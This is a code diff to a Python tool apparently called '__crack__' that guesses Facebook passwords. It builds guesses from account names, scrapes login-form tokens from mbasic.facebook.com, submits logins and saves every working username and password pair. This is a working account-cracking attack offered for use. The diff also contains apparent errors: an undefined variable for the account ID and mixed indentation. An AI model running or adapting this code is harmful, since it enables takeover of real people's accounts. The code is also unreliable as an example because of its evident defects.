@@ -79,17 +79,26 @@ class __crack__:
     def __init__(self):
         self.id = []
 
-    def __api__(self, user, __emo__):
+    def __api__(self, user, __emo__, host, **kwargs):
         global ok,cp,loop
         sys.stdout.write('\r[WAIT] %s/%s -> %s %s'%(loop,len(self.id),len(cp),len(ok))),
         sys.stdout.flush()
         for pw in __emo__:
             pw = pw.lower()
+            kwargs = {}
             ngUA = 'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45'
             ses = requests.Session()
-            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://mbasic.facebook.com")
-            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ngUA, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+            p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
+            b = parser(p,"html.parser")
+		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+		for i in b("input"):
+			try:
+				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+				else:continue
+			except:pass
+            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+            gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
@@ -117,7 +126,7 @@ class __crack__:
                         pwx = [name]
                     else:
                         pwx = [name, x+"123"]
-                    __nemoXD__.submit(self.__api__, uid, pwx)
+                    __nemoXD__.submit(self.__api__, uid, pwx, "https://mbasic.facebook.com")
                 except:
                     pass
 
